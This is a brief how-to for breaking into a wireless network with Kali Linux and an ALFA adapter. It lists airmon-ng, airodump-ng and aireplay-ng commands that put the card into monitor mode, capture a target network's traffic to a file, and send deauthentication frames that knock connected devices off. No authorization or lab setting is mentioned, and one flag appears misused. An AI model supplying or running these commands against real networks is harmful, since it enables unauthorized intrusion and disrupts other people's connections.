To hack a wireless network, you need a wireless card with two features:
1. Make sure your card supports monitor mode/promiscuous mode
2. Make sure you card is capable of performing packet injection.

Now, we will be using Kali Linux with the ALFA W115 short Range adapter.

Wifi Hacking Commands:

1. sudo su

2. cd /home/kali/Desktop/

3. airmon-ng start wlan0   [Before and after check model: iwconfig]

4. airodump-ng wlan0

5. airodump-ng --bssid "mac of wifi" --channel “No” --write hack wlan0

Open New Terminal:

1.cd /home/kali/Desktop/

2. aireplay-ng --deauth 25 -a "mac of wifi" -e "mac of connected device" wlan0
